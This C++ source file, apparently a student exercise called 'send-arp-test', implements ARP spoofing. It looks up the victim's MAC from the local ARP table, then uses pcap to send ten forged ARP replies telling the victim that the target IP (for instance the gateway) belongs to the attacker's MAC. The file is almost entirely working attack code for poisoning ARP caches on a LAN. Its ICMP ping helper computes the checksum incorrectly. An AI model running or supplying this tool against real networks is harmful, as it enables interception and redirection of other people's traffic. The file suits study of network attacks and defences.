#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <unistd.h> 
#include <numeric>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

std::string smac = "";
std::string dmac = "FF:FF:FF:FF:FF:FF";//broadcast
std::string a_smac = "";//smac
std::string sip = "";//Tell-q
std::string tmac = "00:00:00:00:00:00";//unknown-q
std::string tip = "";//who has?-q


void usage() {
	printf("syntax: send-arp-test <interface> <victim-IP> <target-ip>\n");
	printf("sample: send-arp-test wlan0 192.168.100.5 192.168.100.1\n");
}

std::string getmyMAC(const std::string& interface) {
    std::string path = "/sys/class/net/" + interface + "/address";
    std::ifstream infile(path);
    std::string mac;

    if (infile) {
        infile >> mac;
        return mac;
    }

    return "MAC 주소를 찾을 수 없습니다.";
}

std::string get_hw_address(const std::string& target_ip) {
    FILE* arp_fp;
    char ip[16];
    char hw_address[18];
    char line[128];

    arp_fp = fopen("/proc/net/arp", "r");
    if (arp_fp == NULL) {
        std::cerr << "Failed to open arp table" << std::endl;
        return "";
    }
    // Skip the first line (column headers)
    fgets(line, sizeof(line), arp_fp);

    while (fgets(line, sizeof(line), arp_fp)) {
        sscanf(line, "%15s %*s %*s %17s", ip, hw_address);

        if (strcmp(target_ip.c_str(), ip) == 0) { // if the IP addresses match
            fclose(arp_fp);
            return std::string(hw_address);
        }
    }
    fclose(arp_fp);
    return ""; // return an empty string if the target IP was not found
}

void ping(const std::string& targetIp) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        std::cerr << "Error creating socket" << std::endl;
    }

    struct sockaddr_in targetAddr;
    std::memset(&targetAddr, 0, sizeof(targetAddr));
    targetAddr.sin_family = AF_INET;
    inet_pton(AF_INET, targetIp.c_str(), &(targetAddr.sin_addr));

    const int packetSize = sizeof(struct icmphdr);
    char packet[packetSize];
    std::memset(packet, 0, packetSize);

    struct icmphdr* icmpHeader = reinterpret_cast<struct icmphdr*>(packet);
    icmpHeader->type = ICMP_ECHO;
    icmpHeader->code = 0;
    icmpHeader->checksum = 0;
    icmpHeader->un.echo.id = getpid();
    icmpHeader->un.echo.sequence = 1; // Change sequence for each packet sent

    icmpHeader->checksum = htons(static_cast<unsigned short>(std::accumulate(packet, packet + packetSize, 0)));

    int sentBytes = sendto(sockfd, packet, packetSize, 0, (struct sockaddr*)&targetAddr, sizeof(targetAddr));
    if (sentBytes <= 0) {
        std::cerr << "Error sending packet" << std::endl;
        close(sockfd);
        return;
    }
    
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    close(sockfd);
    /*
    // Setting socket option to wait for max 5 seconds for a response
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        std::cerr << "Error setting socket options" << std::endl;
        close(sockfd);
        return;
    }

    char recvPacket[packetSize];
    struct sockaddr_in recvAddr;
    socklen_t addrLen = sizeof(recvAddr);

    int receivedBytes = recvfrom(sockfd, recvPacket, packetSize, 0, (struct sockaddr*)&recvAddr, &addrLen);
    if (receivedBytes <= 0) {
        std::cerr << "Error receiving packet or timeout occurred" << std::endl;
        close(sockfd);
        return;
    }

    close(sockfd);*/
}

//arp를 보내는 함수
int sarp_f(int sw1,int argc, char* argv[]) { // Function return type changed to int

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dmac.c_str());
	packet.eth_.smac_ = Mac(smac.c_str());
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    if(sw1==0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if(sw1==1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
	packet.arp_.smac_ = Mac(a_smac.c_str());
	packet.arp_.sip_ = htonl(Ip(sip.c_str()));
	packet.arp_.tmac_ = Mac(tmac.c_str());
	packet.arp_.tip_ = htonl(Ip(tip.c_str()));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
	return 0; // Return 0 if everything went well
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}
    std::string mymac = getmyMAC(argv[1]);
    std::cout << "HOST MAC 주소: " << mymac << std::endl;
    std::string victim_ip = argv[2];
    printf("Victim:%s\n",victim_ip.c_str());
    std::string target_ip = argv[3];
    printf("Target:%s\n",target_ip.c_str());
    ping(victim_ip.c_str());
    std::string hw_address_v;

    hw_address_v = get_hw_address(victim_ip);

    if (strcmp(hw_address_v.c_str(), "00:00:00:00:00:00") == 0) {
        std::cout << "Not Found in Local LAN" << victim_ip << " found in ARP table" << std::endl;
        return 0;
    }
    else if (!hw_address_v.empty()) {
        std::cout << "Hardware address for IP " << victim_ip << " is " << hw_address_v << std::endl;
    }else {
        std::cout << "No entry for IP or Host IP " << victim_ip << " found in ARP table" << std::endl;
        return 0;
    }
    smac = mymac;
    dmac = hw_address_v;
    tmac= hw_address_v;
    a_smac = mymac;
    sip = target_ip;
    tip = victim_ip;
    for(int i=0;i<10;i++){
        sarp_f(1,argc, argv); // Call the function 10 times
        std::cout <<"send arp"<<i<<std::endl;
    }
}
